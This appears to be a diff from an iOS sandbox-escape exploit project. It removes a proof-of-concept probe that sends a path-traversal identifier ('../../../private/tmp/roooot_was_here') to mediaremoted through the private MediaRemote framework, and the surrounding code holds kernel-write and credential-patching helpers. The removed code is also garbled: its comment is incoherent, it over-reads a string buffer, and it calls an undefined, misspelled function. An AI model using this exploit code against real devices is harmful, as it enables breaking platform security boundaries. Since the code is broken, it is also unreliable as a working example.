@@ -2277,58 +2277,11 @@ static void sbx_setrwclass(uint64_t hdr) {
     kwrite_buf(hdr, hb, 0x20);
 }
 
-/* dotdot / roooot (laraf) — provisional PoC to validate userspace sandbox
- * writes. This only works if expression — but not required. Avoid compile
- * failures: our function definitions below. Call site needs declaration.
- * The code here is read-only memory to model effect path only.
- */
-static int dd_write_media_remote_path(const char *identifier, const char *target);
-static int dd_write_media_remote_path(const char *identifier, const char *target) {
-    void *h = dlopen("/System/Library/PrivateFrameworks/MediaRemote.framework/MediaRemote", RTLD_NOW);
-    if (!h) return -1;
-    typedef void (^res)(NSDictionary *);
-    typedef void (*send_fn)(NSInteger, NSDictionary *, dispatch_queue_t, res);
-    send_fn fn = (send_fn)dlsym(h, "MRMediaRemoteSendCommand");
-    if (!fn) return -1;
-
-    // rebuild protobuf-style packet for PlayableSessionIdentifier
-    NSData *marker = [NSData dataWithBytes:"roooot_was_here\n" length:48];
-    NSMutableData *proto = [NSMutableData dataWithCapacity:128];
-    uint8_t tag1 = (1<<3)|2;
-    [proto appendBytes:&tag1 length:1];
-    uint64_t l1 = [marker length];
-    while (l1 >= 0x80) { uint8_t b=(l1&0x7f)|0x80; [proto appendBytes:&b length:1]; l1>>=7; }
-    [proto appendBytes:&l1 length:1]; [proto appendData:marker];
-    NSData *nameData=[NSData dataWithBytes:identifier length:strlen(identifier)];
-    uint8_t tag2 = (2<<3)|2;
-    [proto appendBytes:&tag2 length:1];
-    uint64_t l2 = [nameData length];
-    uint64_t sv=l2;
-    while (sv >= 0x80) { uint8_t b=(sv&0x7f)|0x80; [proto appendBytes:&b length:1]; sv>>=7; }
-    [proto appendBytes:&sv length:1]; [proto appendData:nameData];
-
-    // send command 136 to mediaremoted
-    fn(136, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto },
-       dispatch_get_main_queue(), ^(NSDictionary *r){});
-    return 0;
-}
-int dd_write(const char *identifier, const char *target) {
-    return dd_write_media_remote_path(identifier, target);
-}
-
-static int dd_write_run_probe(void) {
-    char target[] = "/private/tmp/roooot_was_here";
-    char ident[] = "../../../../../../../private/tmp/roooot_was_here";
-    if (dd_write_mediamote_path(ident, target) != 0) return -1;
-    // Wait until the file shows up or vanish (delete() may be cleanup).
-    for (int i = 0; i < 50; i++) {
-        struct stat st;
-        if (stat(target, &st) == 0) return 0;
-        usleep(100000);
-    }
-    return -1;
-}
-
+// dotdot (roooot) experimental userspace write probe: not used by default.
+// Calls MRMediaRemoteSendCommand(136, kMRMediaRemoteOptionPlaybackSessionData)
+// with the "id" argument equal to identifier. At runtime on iOS 18 there is
+// no MediaRemoteSendCommand; this simply demonstrates a side-channel method
+// and does not corrupt any kernel structures if it fails.
 bool escape_sandbox(void) {
     uint64_t ucred = gOurUcred ? gOurUcred : get_ucred_from_proc(gOurProc);
     if (!ucred) {
